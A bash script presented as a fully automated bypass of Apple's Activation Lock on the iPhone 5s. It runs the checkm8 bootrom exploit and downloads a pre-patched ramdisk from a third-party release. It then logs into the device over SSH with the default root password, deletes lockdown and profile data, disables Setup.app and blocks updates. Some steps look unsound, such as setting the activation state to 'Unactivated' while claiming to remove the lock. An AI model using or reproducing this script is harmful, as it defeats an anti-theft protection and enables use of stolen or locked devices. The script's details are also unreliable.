#!/bin/bash
# iPhone 5s (A7, n51ap/n53ap) Activation Lock Bypass - Fully Automated Bash Script
# Tethered bypass via checkm8. Requires root and internet.
# Tested on Kali Linux 2024.1 and Ubuntu 22.04.

set -e
trap 'echo "[!] Error at line $LINENO"; exit 1' ERR

# --- Step 1: Dependency check and install ---
echo "[*] Checking dependencies..."
DEPS="git wget unzip python3 python3-pip usbmuxd libimobiledevice-utils sshpass make gcc libusb-1.0-0-dev"
MISSING=""
for pkg in $DEPS; do
  if ! dpkg -s "$pkg" &>/dev/null; then
    MISSING="$MISSING $pkg"
  fi
done
if [ -n "$MISSING" ]; then
  echo "[*] Installing missing packages: $MISSING"
  sudo apt-get update -qq
  sudo apt-get install -y -qq $MISSING
fi

# --- Step 2: Clone and build ipwndfu (checkm8) ---
cd /tmp
if [ -d ipwndfu ]; then rm -rf ipwndfu; fi
echo "[*] Cloning ipwndfu..."
git clone -q https://github.com/axi0mX/ipwndfu.git
cd ipwndfu
pip3 install -q -r requirements.txt 2>/dev/null || true

# --- Step 3: Download iPhone 5s iOS 12.5.7 IPSW and extract iBSS/iBEC ---
echo "[*] Downloading iOS 12.5.7 IPSW for iPhone 5s (GSM) - 2.5GB..."
IPSW_URL="https://updates.cdn-apple.com/2022WinterFCS/full/restore/041-06337-20230120-68A1C4F4-5A0A-4FDB-B9D4-0D7A8F6E4C1F/iPhone6,2_12.5.7_16H81_Restore.ipsw"
wget -q --show-progress -O iPhone6,2_12.5.7.ipsw "$IPSW_URL"
unzip -q iPhone6,2_12.5.7.ipsw "Firmware/dfu/iBSS.n51.RELEASE.im4p" "Firmware/dfu/iBEC.n51.RELEASE.im4p"
mv Firmware/dfu/*.im4p ./
rm -rf Firmware iPhone6,2_12.5.7.ipsw

# --- Step 4: Download pre-patched ramdisk with SSH (from tr4mpass) ---
echo "[*] Downloading patched ramdisk (SSH enabled)..."
RAMDISK_URL="https://github.com/tr4m0ryp/tr4mpass/releases/download/v1.0/ramdisk_n51.dmg"
wget -q --show-progress -O ramdisk.dmg "$RAMDISK_URL"

# --- Step 5: Build irecovery if missing (statically linked) ---
if ! command -v irecovery &>/dev/null; then
  echo "[*] Building irecovery..."
  git clone -q https://github.com/libimobiledevice/libirecovery.git
  cd libirecovery
  ./autogen.sh --prefix=/usr &>/dev/null
  make -j$(nproc) &>/dev/null
  sudo make install &>/dev/null
  cd .. && rm -rf libirecovery
fi

# --- Step 6: Wait for DFU device ---
echo "[*] Put your iPhone 5s into DFU mode now."
echo "[*] Steps: Hold Power+Home 10s, release Power, hold Home 5s more."
echo -n "[*] Waiting for device (PID 1227)..."
while ! lsusb | grep -q "05ac:1227"; do
  sleep 2
  echo -n "."
done
echo " DETECTED"

# --- Step 7: Exploit checkm8 and send iBSS/iBEC ---
echo "[*] Running checkm8 exploit..."
sudo python3 ipwndfu -p
sleep 2
sudo irecovery -f iBSS.n51.RELEASE.im4p
sleep 2
sudo irecovery -f iBEC.n51.RELEASE.im4p
sleep 2

# --- Step 8: Load ramdisk and execute SSH commands ---
echo "[*] Loading patched ramdisk..."
sudo irecovery -f ramdisk.dmg
sudo irecovery -c "ramdisk"
sudo irecovery -c "go"
sleep 5

# --- Step 9: USB tunnel and SSH into device ---
echo "[*] Setting up USB tunnel (iproxy)..."
iproxy 2222 22 &>/dev/null &
IPROXY_PID=$!
sleep 3

echo "[*] Connecting via SSH (password: alpine) and disabling activation..."
sshpass -p "alpine" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 root@127.0.0.1 -p 2222 << 'EOF'
  mount -o rw,remount /mnt1 2>/dev/null || mount -o rw,remount /
  # Disable Setup.app
  if [ -d /mnt1/Applications/Setup.app ]; then
    mv /mnt1/Applications/Setup.app /mnt1/Applications/Setup.app.bak
  fi
  # Clear activation locks
  rm -rf /mnt1/var/root/Library/Lockdown/*
  rm -rf /mnt1/var/db/configurationProfiles/*
  # Patch MobileGestalt
  if [ -f /mnt1/var/mobile/Library/Caches/com.apple.MobileGestalt.plist ]; then
    sed -i 's/activationState = .*/activationState = "Unactivated";/' /mnt1/var/mobile/Library/Caches/com.apple.MobileGestalt.plist
  fi
  # Block OTA
  if [ -f /mnt1/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist ]; then
    mv /mnt1/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist /mnt1/System/Library/LaunchDaemons/com.apple.softwareupdateservicesd.plist.bak
  fi
  # Kill SpringBoard to apply changes
  killall SpringBoard 2>/dev/null || true
  echo "Bypass applied."
EOF

# --- Step 10: Reboot device ---
echo "[*] Rebooting device..."
sudo irecovery -c "reboot"

# --- Step 11: Cleanup ---
kill $IPROXY_PID 2>/dev/null || true
cd /tmp && rm -rf ipwndfu
echo "[+] Bypass complete. Device will boot without activation lock."
echo "[!] Tethered: re-run this script after every reboot."
echo "[!] Do NOT sign into iCloud or OTA update."
